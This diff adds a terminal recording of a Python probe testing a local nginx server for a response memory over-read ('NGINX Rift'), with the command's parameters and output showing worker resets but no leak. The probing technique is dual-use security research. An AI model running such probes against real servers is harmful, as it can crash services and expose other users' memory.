@@ -1,0 +1,8 @@
+{"version":3,"term":{"cols":132,"rows":34},"timestamp":1779229397,"idle_time_limit":1.0,"command":"python3 tools/non_lfi_active_response_probe.py --target 127.0.0.1:19321 --plus-counts 64,962 --suffixes 000000 --victims 2 --victim-delay 0.4 --recv-timeout 2","title":"NGINX Rift active response leak negative probe","env":{"SHELL":"/opt/homebrew/bin/fish"}}
+[0.045, "o", "[*] target=http://127.0.0.1:19321\r\n[*] primitive=remote HTTP only; no LFI/phpinfo/procfs/core reads\r\n[*] active candidate=delayed /spray proxy response over-read\r\n\r\n[+] plus_count=64 suffix='000000' victims=2\r\n"]
+[0.183, "o", "    trigger status: <no response> err=-\r\n    trigger body: len=0 nonprint=0 ptr_like=0\r\n"]
+[0.000, "o", "    victim 1: reset status='<no response>' len=0 nonprint=0 ptr_like=0 err=-\r\n    victim 2: reset status='<no response>' len=0 nonprint=0 ptr_like=0 err=-\r\n\r\n[+] plus_count=962 suffix='000000' victims=2\r\n"]
+[0.188, "o", "    trigger status: HTTP/1.1 404 Not Found err=-\r\n"]
+[0.000, "o", "    trigger body: len=153 nonprint=0 ptr_like=0\r\n"]
+[0.000, "o", "    victim 1: reset status='<no response>' len=0 nonprint=0 ptr_like=0 err=-\r\n    victim 2: reset status='<no response>' len=0 nonprint=0 ptr_like=0 err=-\r\n\r\n[*] summary: clean=0 reset=4 interesting=0\r\n[+] no active response over-read observed in this sweep\r\n[*] worker resets/crashes occurred, but victim responses did not leak memory\r\n"]
+[0.017, "x", "0"]
